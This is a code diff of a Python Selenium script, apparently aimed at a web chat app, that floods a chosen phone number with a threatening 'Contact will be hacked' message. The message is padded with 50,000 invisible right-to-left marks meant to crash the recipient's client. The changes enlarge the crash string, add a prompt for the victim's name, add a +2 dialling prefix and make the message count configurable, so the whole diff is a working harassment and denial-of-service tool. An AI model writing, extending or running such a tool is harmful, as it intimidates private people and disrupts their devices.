@@ -105,22 +105,22 @@ def main():
                     chat_box.send_keys(Keys.CONTROL, 'v')
                     chat_box.send_keys(Keys.ENTER)
 
-                    # لمسة "المهندس": Burst Mode
+                    # Burst Mode
                     if i % 20 == 0:
                         print(f"Done (a number of msgs is 20)")
                         time.sleep(0.1) #sleep
                     
                     # Done
-                    print(f"[{i}/{count}] - القنبلة طارت! 💣")
+                    print(f"[{i}/{count}] - Bomb! 💣")
                 end_time = time.time()
                 duration = round(end_time - start_time, 2)
-                print(f"\n✔ mission complete during {duration} s.")
+                print(f"\n✔ mission completed during {duration}s.")
             except Exception as e:
                 print(f"× Ooops Error!: {e}")
 
-
-    my_msg = """
-    ☞ shatafa Contact will be hacked
+    name = input("enter name of your target (e.g. Biro) > ")
+    my_msg = f"""
+    ☞ {name} Contact will be hacked
     You will be hacked By Biro Bot 7 
     "أجمد تهكير في المجال"
     "★彡✦ السراب البعيد ✦彡★"
@@ -147,12 +147,12 @@ def main():
     Loading....
     """
 
-    invisible_crash = "‏" * 5000
-
-    target_number = input("enter your number phone > ")
+    invisible_crash = "‏" * 50000
+    
+    target_number = input("enter your number phone (e.g. 01xxxxxx) > ")
     bomb_payload = (my_msg + "\n" + invisible_crash) * 10
-
-    send_scary_msg(target_number, bomb_payload, 100)
+    count = int(input("enter the count of msgs (e.g. 10) > "))
+    send_scary_msg(("+2" + str(target_number)), bomb_payload, count)
 
     print("\n ✔ mission done successfully")
     input("Press enter to end..")
